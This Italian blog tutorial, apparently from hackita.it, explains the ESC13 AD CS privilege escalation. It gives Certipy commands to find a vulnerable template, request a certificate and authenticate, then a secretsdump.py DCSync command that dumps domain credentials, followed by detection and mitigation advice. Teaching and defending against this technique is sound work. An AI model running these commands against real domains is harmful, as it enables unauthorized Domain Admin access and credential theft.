---
title: 'ESC13 ADCS: Privilege Escalation tramite Issuance Policy OID'
slug: esc13-adcs
description: >-
  ESC13 sfrutta Issuance Policy OID collegati a gruppi Active Directory. Un
  certificato può aggiungere SID privilegiati al TGT Kerberos e portare a Domain
  Admin.
image: /13.webp
draft: false
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

ESC13 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta una configurazione pericolosa tra **Issuance Policy OID e gruppi Active Directory**. In questo scenario un template di certificato include una **Issuance Policy OID** che, nella configurazione PKI di Active Directory, è collegata a un **gruppo AD tramite l’attributo `msDS-OIDToGroupLink`**.

Quando un utente autentica tramite certificato (PKINIT), il **KDC legge l’OID presente nel certificato** e verifica se quell’OID è collegato a un gruppo. Se esiste un collegamento, il **SID del gruppo viene aggiunto al Kerberos TGT** all’interno del PAC.

Questo significa che il certificato diventa un **claim di appartenenza al gruppo**.

Se il gruppo collegato è privilegiato (ad esempio **Domain Admins** o un gruppo con diritti DCSync), l’utente che ottiene quel certificato può **ereditare quei privilegi durante la sessione Kerberos**.

ESC13 è quindi una forma di escalation che non modifica direttamente ACL o utenti, ma sfrutta la **logica di mapping PKI → gruppi AD**.

***

# Componenti della vulnerabilità

Perché ESC13 sia sfruttabile devono esistere queste condizioni:

* il template contiene **Issuance Policy OID**
* l’OID è collegato a un **gruppo AD**
* il template permette **Client Authentication**
* l’attaccante ha **Enroll permission**

Il collegamento tra OID e gruppo si trova nella configurazione PKI:

```
CN=OID
CN=Public Key Services
CN=Services
CN=Configuration
```

L’attributo chiave è:

```
msDS-OIDToGroupLink
```

***

# Identificazione con Certipy

Certipy può individuare template con **Issuance Policy collegata a gruppi**.

```bash
certipy find -u attacker@corp.local -p 'Passw0rd!'
```

Output tipico:

```
Template Name: SecureAdminsAuthentication
Client Authentication: True
Issuance Policies: 1.3.6.1.4.1.311....
Linked Groups: CN=SecureAdmins,CN=Users,DC=CORP,DC=LOCAL
Enrollment Rights: Domain Users

[!] Vulnerabilities
ESC13 : Template allows client authentication and issuance policy linked to group
```

Indicatori chiave:

* presenza di **Issuance Policies**
* presenza di **Linked Groups**
* enrollment permesso a utenti non privilegiati

***

# Exploitation ESC13

L’attacco consiste semplicemente nel **richiedere il certificato dal template vulnerabile**.

## Step 1 — Richiedere certificato

```bash
certipy req \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-target CA.CORP.LOCAL \
-ca CORP-CA \
-template SecureAdminsAuthentication
```

Output:

```
Successfully requested certificate
Saving certificate to attacker.pfx
```

Il certificato contiene l’OID collegato al gruppo privilegiato.

***

## Step 2 — Autenticazione con il certificato

```bash
certipy auth -pfx attacker.pfx -dc-ip 10.0.0.100
```

Output:

```
Got TGT
Saving credential cache to user.ccache
Got hash for attacker@corp.local
```

Il **TGT ora include il SID del gruppo collegato all’OID**.

***

## Step 3 — Uso del ticket privilegiato

Impostare il ticket Kerberos:

```bash
export KRB5CCNAME=user.ccache
```

Ora è possibile eseguire operazioni privilegiate.

Esempio **DCSync**:

```bash
secretsdump.py -k -no-pass corp.local/user@dc.corp.local
```

Se il gruppo collegato ha diritti sufficienti, verranno dumpate le credenziali del dominio.

***

# Impatto ESC13

Un template ESC13 permette a un utente normale di ottenere **privilegi di gruppo tramite certificato**.

Il risultato può essere:

* Domain Admin
* DCSync
* accesso amministrativo su sistemi
* compromissione completa del dominio

***

# Detection ESC13

Indicatori utili:

* template con **Issuance Policy OID**
* OID collegati a gruppi AD
* template enrollabile da utenti non privilegiati

Audit utile:

```
CN=OID,CN=Public Key Services
```

***

# Mitigation ESC13

Le contromisure principali sono legate alla gestione degli OID e dei template.

Misure raccomandate:

* evitare collegamenti OID → gruppi privilegiati
* limitare **enrollment rights**
* proteggere ACL sugli oggetti **OID**
* usare **manager approval** sui template sensibili
* disabilitare template inutilizzati

Gli oggetti OID dovrebbero essere gestiti solo da **Enterprise Admins o PKI administrators**.

***

# FAQ — ESC13 ADCS

### Cos'è ESC13?

Una escalation AD CS basata su **Issuance Policy OID collegata a gruppi Active Directory**.

### Come funziona l'escalation?

Il KDC aggiunge il **SID del gruppo collegato all’OID** nel Kerberos TGT.

### Serve modificare utenti o ACL?

No. Basta ottenere un certificato dal template vulnerabile.

### ESC13 può portare a Domain Admin?

Sì, se l’OID è collegato a un gruppo privilegiato.

***

**Key Takeaway:** se un template include una Issuance Policy collegata a un gruppo privilegiato, chiunque possa ottenere quel certificato può autenticarsi con i privilegi di quel gruppo.

***

> ESC13 è una delle tecniche più sottovalutate negli attacchi AD CS.
> Guida completa alle escalation AD CS:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le prossime tecniche:
> [https://hackita.it/articoli/esc14-adcs](https://hackita.it/articoli/esc14-adcs) · [https://hackita.it/articoli/esc15-adcs](https://hackita.it/articoli/esc15-adcs)Supporta HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare AD exploitation o testare la sicurezza della tua infrastruttura?
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
